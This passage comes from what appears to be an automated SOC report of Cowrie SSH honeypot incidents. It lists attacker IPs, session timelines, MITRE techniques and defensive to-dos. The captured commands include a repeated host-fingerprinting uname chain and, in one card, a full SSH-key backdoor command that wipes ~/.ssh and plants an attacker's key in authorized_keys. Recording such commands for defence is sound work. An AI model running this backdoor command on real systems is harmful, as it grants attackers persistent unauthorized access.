- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0154659253da

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-26 09:42 |
| **Last Seen** | 2026-07-26 09:42 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 09:42:01` | `cowrie.session.connect` |
| `2026-07-26 09:42:02` | `cowrie.client.version` |
| `2026-07-26 09:42:02` | `cowrie.client.kex` |
| `2026-07-26 09:42:06` | `cowrie.login.success` |
| `2026-07-26 09:42:09` | `cowrie.session.params` |
| `2026-07-26 09:42:09` | `cowrie.command.input` |
| `2026-07-26 09:42:09` | `cowrie.command.input` |
| `2026-07-26 09:42:09` | `cowrie.command.input` |
| `2026-07-26 09:42:09` | `cowrie.command.input` |
| `2026-07-26 09:42:09` | `cowrie.command.input` |
| `2026-07-26 09:42:09` | `cowrie.command.success` |
| `2026-07-26 09:42:09` | `cowrie.command.input` |
| `2026-07-26 09:42:09` | `cowrie.command.input` |
| `2026-07-26 09:42:09` | `cowrie.command.input` |
| `2026-07-26 09:42:09` | `cowrie.command.input` |
| `2026-07-26 09:42:10` | `cowrie.log.closed` |
| `2026-07-26 09:42:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-607533ede33b

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-26 09:44 |
| **Last Seen** | 2026-07-26 09:45 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 09:44:51` | `cowrie.session.connect` |
| `2026-07-26 09:44:52` | `cowrie.client.version` |
| `2026-07-26 09:44:52` | `cowrie.client.kex` |
| `2026-07-26 09:44:57` | `cowrie.login.success` |
| `2026-07-26 09:44:59` | `cowrie.session.params` |
| `2026-07-26 09:44:59` | `cowrie.command.input` |
| `2026-07-26 09:44:59` | `cowrie.command.input` |
| `2026-07-26 09:44:59` | `cowrie.command.input` |
| `2026-07-26 09:44:59` | `cowrie.command.input` |
| `2026-07-26 09:44:59` | `cowrie.command.input` |
| `2026-07-26 09:44:59` | `cowrie.command.success` |
| `2026-07-26 09:44:59` | `cowrie.command.input` |
| `2026-07-26 09:44:59` | `cowrie.command.input` |
| `2026-07-26 09:44:59` | `cowrie.command.input` |
| `2026-07-26 09:44:59` | `cowrie.command.input` |
| `2026-07-26 09:45:01` | `cowrie.log.closed` |
| `2026-07-26 09:45:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-716a6d1974b9

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-26 09:47 |
| **Last Seen** | 2026-07-26 09:48 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 09:47:47` | `cowrie.session.connect` |
| `2026-07-26 09:47:48` | `cowrie.client.version` |
| `2026-07-26 09:47:48` | `cowrie.client.kex` |
| `2026-07-26 09:47:53` | `cowrie.login.success` |
| `2026-07-26 09:47:57` | `cowrie.session.params` |
| `2026-07-26 09:47:57` | `cowrie.command.input` |
| `2026-07-26 09:47:57` | `cowrie.command.input` |
| `2026-07-26 09:47:57` | `cowrie.command.input` |
| `2026-07-26 09:47:57` | `cowrie.command.input` |
| `2026-07-26 09:47:57` | `cowrie.command.input` |
| `2026-07-26 09:47:57` | `cowrie.command.success` |
| `2026-07-26 09:47:57` | `cowrie.command.input` |
| `2026-07-26 09:47:57` | `cowrie.command.input` |
| `2026-07-26 09:47:57` | `cowrie.command.input` |
| `2026-07-26 09:47:57` | `cowrie.command.input` |
| `2026-07-26 09:47:58` | `cowrie.log.closed` |
| `2026-07-26 09:48:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0efe89045019

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-26 09:50 |
| **Last Seen** | 2026-07-26 09:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 09:50:44` | `cowrie.session.connect` |
| `2026-07-26 09:50:44` | `cowrie.client.version` |
| `2026-07-26 09:50:45` | `cowrie.client.kex` |
| `2026-07-26 09:50:45` | `cowrie.login.success` |
| `2026-07-26 09:50:45` | `cowrie.direct-tcpip.request` |
| `2026-07-26 09:50:45` | `cowrie.direct-tcpip.data` |
| `2026-07-26 09:50:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9bb62924592d

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-26 09:51 |
| **Last Seen** | 2026-07-26 09:51 |
| **Session Duration** | 30s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 09:51:11` | `cowrie.session.connect` |
| `2026-07-26 09:51:13` | `cowrie.client.version` |
| `2026-07-26 09:51:13` | `cowrie.client.kex` |
| `2026-07-26 09:51:22` | `cowrie.login.success` |
| `2026-07-26 09:51:34` | `cowrie.session.params` |
| `2026-07-26 09:51:34` | `cowrie.command.input` |
| `2026-07-26 09:51:34` | `cowrie.command.input` |
| `2026-07-26 09:51:34` | `cowrie.command.input` |
| `2026-07-26 09:51:34` | `cowrie.command.input` |
| `2026-07-26 09:51:34` | `cowrie.command.input` |
| `2026-07-26 09:51:34` | `cowrie.command.success` |
| `2026-07-26 09:51:34` | `cowrie.command.input` |
| `2026-07-26 09:51:34` | `cowrie.command.input` |
| `2026-07-26 09:51:34` | `cowrie.command.input` |
| `2026-07-26 09:51:34` | `cowrie.command.input` |
| `2026-07-26 09:51:38` | `cowrie.log.closed` |
| `2026-07-26 09:51:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-388be9c2d949

| Field | Detail |
|---|---|
| **Source IP** | `47.77.182[.]54` |
| **First Seen** | 2026-07-26 09:53 |
| **Last Seen** | 2026-07-26 09:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 09:53:04` | `cowrie.session.connect` |
| `2026-07-26 09:53:04` | `cowrie.client.version` |
| `2026-07-26 09:53:04` | `cowrie.client.kex` |
| `2026-07-26 09:53:04` | `cowrie.login.success` |
| `2026-07-26 09:53:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.77.182[.]54` to AbuseIPDB if not already reported
- [ ] Block `47.77.182[.]54` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69ab18807d60

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-07-26 09:53 |
| **Last Seen** | 2026-07-26 09:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 09:53:04` | `cowrie.session.connect` |
| `2026-07-26 09:53:04` | `cowrie.client.version` |
| `2026-07-26 09:53:04` | `cowrie.client.kex` |
| `2026-07-26 09:53:05` | `cowrie.login.success` |
| `2026-07-26 09:53:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9aa595660096

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-26 09:54 |
| **Last Seen** | 2026-07-26 09:54 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 09:54:29` | `cowrie.session.connect` |
| `2026-07-26 09:54:31` | `cowrie.client.version` |
| `2026-07-26 09:54:31` | `cowrie.client.kex` |
| `2026-07-26 09:54:38` | `cowrie.login.success` |
| `2026-07-26 09:54:42` | `cowrie.session.params` |
| `2026-07-26 09:54:42` | `cowrie.command.input` |
| `2026-07-26 09:54:42` | `cowrie.command.input` |
| `2026-07-26 09:54:42` | `cowrie.command.input` |
| `2026-07-26 09:54:42` | `cowrie.command.input` |
| `2026-07-26 09:54:42` | `cowrie.command.input` |
| `2026-07-26 09:54:42` | `cowrie.command.success` |
| `2026-07-26 09:54:42` | `cowrie.command.input` |
| `2026-07-26 09:54:42` | `cowrie.command.input` |
| `2026-07-26 09:54:42` | `cowrie.command.input` |
| `2026-07-26 09:54:42` | `cowrie.command.input` |
| `2026-07-26 09:54:44` | `cowrie.log.closed` |
| `2026-07-26 09:54:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d85b1c873a02

| Field | Detail |
|---|---|
| **Source IP** | `189.52.52[.]162` |
| **First Seen** | 2026-07-26 09:56 |
| **Last Seen** | 2026-07-26 09:56 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 09:56:13` | `cowrie.session.connect` |
| `2026-07-26 09:56:13` | `cowrie.client.version` |
| `2026-07-26 09:56:13` | `cowrie.client.kex` |
| `2026-07-26 09:56:15` | `cowrie.login.success` |
| `2026-07-26 09:56:16` | `cowrie.direct-tcpip.request` |
| `2026-07-26 09:56:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.52.52[.]162` to AbuseIPDB if not already reported
- [ ] Block `189.52.52[.]162` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0dcd69c0c6e4

| Field | Detail |
|---|---|
| **Source IP** | `125.20.207[.]154` |
| **First Seen** | 2026-07-26 09:56 |
| **Last Seen** | 2026-07-26 09:56 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 09:56:22` | `cowrie.session.connect` |
| `2026-07-26 09:56:24` | `cowrie.client.version` |
| `2026-07-26 09:56:25` | `cowrie.client.kex` |
| `2026-07-26 09:56:31` | `cowrie.login.success` |
| `2026-07-26 09:56:32` | `cowrie.direct-tcpip.request` |
| `2026-07-26 09:56:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.20.207[.]154` to AbuseIPDB if not already reported
- [ ] Block `125.20.207[.]154` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06cb55fc3ab3

| Field | Detail |
|---|---|
| **Source IP** | `217.150.37[.]249` |
| **First Seen** | 2026-07-26 09:57 |
| **Last Seen** | 2026-07-26 09:57 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 09:57:30` | `cowrie.session.connect` |
| `2026-07-26 09:57:31` | `cowrie.client.version` |
| `2026-07-26 09:57:31` | `cowrie.client.kex` |
| `2026-07-26 09:57:32` | `cowrie.login.success` |
| `2026-07-26 09:57:33` | `cowrie.direct-tcpip.request` |
| `2026-07-26 09:57:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.150.37[.]249` to AbuseIPDB if not already reported
- [ ] Block `217.150.37[.]249` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3770ab4c8553

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-26 09:57 |
| **Last Seen** | 2026-07-26 09:57 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 09:57:33` | `cowrie.session.connect` |
| `2026-07-26 09:57:35` | `cowrie.client.version` |
| `2026-07-26 09:57:35` | `cowrie.client.kex` |
| `2026-07-26 09:57:37` | `cowrie.login.success` |
| `2026-07-26 09:57:42` | `cowrie.session.params` |
| `2026-07-26 09:57:42` | `cowrie.command.input` |
| `2026-07-26 09:57:42` | `cowrie.command.input` |
| `2026-07-26 09:57:42` | `cowrie.command.input` |
| `2026-07-26 09:57:42` | `cowrie.command.input` |
| `2026-07-26 09:57:42` | `cowrie.command.input` |
| `2026-07-26 09:57:42` | `cowrie.command.success` |
| `2026-07-26 09:57:42` | `cowrie.command.input` |
| `2026-07-26 09:57:42` | `cowrie.command.input` |
| `2026-07-26 09:57:42` | `cowrie.command.input` |
| `2026-07-26 09:57:42` | `cowrie.command.input` |
| `2026-07-26 09:57:44` | `cowrie.log.closed` |
| `2026-07-26 09:57:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f469f2def039

| Field | Detail |
|---|---|
| **Source IP** | `188.36.7[.]196` |
| **First Seen** | 2026-07-26 09:57 |
| **Last Seen** | 2026-07-26 09:57 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 09:57:38` | `cowrie.session.connect` |
| `2026-07-26 09:57:39` | `cowrie.client.version` |
| `2026-07-26 09:57:39` | `cowrie.client.kex` |
| `2026-07-26 09:57:40` | `cowrie.login.success` |
| `2026-07-26 09:57:41` | `cowrie.direct-tcpip.request` |
| `2026-07-26 09:57:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `188.36.7[.]196` to AbuseIPDB if not already reported
- [ ] Block `188.36.7[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b891a7b842bf

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-26 10:00 |
| **Last Seen** | 2026-07-26 10:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 10:00:07` | `cowrie.session.connect` |
| `2026-07-26 10:00:07` | `cowrie.client.version` |
| `2026-07-26 10:00:08` | `cowrie.client.kex` |
| `2026-07-26 10:00:08` | `cowrie.login.success` |
| `2026-07-26 10:00:08` | `cowrie.direct-tcpip.request` |
| `2026-07-26 10:00:08` | `cowrie.direct-tcpip.data` |
| `2026-07-26 10:00:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31c44087e927

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-26 10:00 |
| **Last Seen** | 2026-07-26 10:00 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 10:00:35` | `cowrie.session.connect` |
| `2026-07-26 10:00:36` | `cowrie.client.version` |
| `2026-07-26 10:00:36` | `cowrie.client.kex` |
| `2026-07-26 10:00:41` | `cowrie.login.success` |
| `2026-07-26 10:00:44` | `cowrie.session.params` |
| `2026-07-26 10:00:44` | `cowrie.command.input` |
| `2026-07-26 10:00:44` | `cowrie.command.input` |
| `2026-07-26 10:00:44` | `cowrie.command.input` |
| `2026-07-26 10:00:44` | `cowrie.command.input` |
| `2026-07-26 10:00:44` | `cowrie.command.input` |
| `2026-07-26 10:00:44` | `cowrie.command.success` |
| `2026-07-26 10:00:44` | `cowrie.command.input` |
| `2026-07-26 10:00:44` | `cowrie.command.input` |
| `2026-07-26 10:00:44` | `cowrie.command.input` |
| `2026-07-26 10:00:44` | `cowrie.command.input` |
| `2026-07-26 10:00:46` | `cowrie.log.closed` |
| `2026-07-26 10:00:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-afd8ed2d9ac3

| Field | Detail |
|---|---|
| **Source IP** | `98.70.127[.]17` |
| **First Seen** | 2026-07-26 10:03 |
| **Last Seen** | 2026-07-26 10:03 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 10:03:10` | `cowrie.session.connect` |
| `2026-07-26 10:03:10` | `cowrie.client.version` |
| `2026-07-26 10:03:11` | `cowrie.client.kex` |
| `2026-07-26 10:03:11` | `cowrie.login.success` |
| `2026-07-26 10:03:12` | `cowrie.session.params` |
| `2026-07-26 10:03:12` | `cowrie.command.input` |
| `2026-07-26 10:03:12` | `cowrie.command.failed` |
| `2026-07-26 10:03:13` | `cowrie.log.closed` |
| `2026-07-26 10:03:14` | `cowrie.session.params` |
| `2026-07-26 10:03:14` | `cowrie.command.input` |
| `2026-07-26 10:03:14` | `cowrie.session.file_download` |
| `2026-07-26 10:03:14` | `cowrie.log.closed` |
| `2026-07-26 10:03:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `98.70.127[.]17` to AbuseIPDB if not already reported
- [ ] Block `98.70.127[.]17` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b9bc4b20650

| Field | Detail |
|---|---|
| **Source IP** | `98.70.127[.]17` |
| **First Seen** | 2026-07-26 10:03 |
| **Last Seen** | 2026-07-26 10:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 10:03:14` | `cowrie.session.connect` |
| `2026-07-26 10:03:14` | `cowrie.client.version` |
| `2026-07-26 10:03:14` | `cowrie.client.kex` |
| `2026-07-26 10:03:15` | `cowrie.login.success` |
| `2026-07-26 10:03:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `98.70.127[.]17` to AbuseIPDB if not already reported
- [ ] Block `98.70.127[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

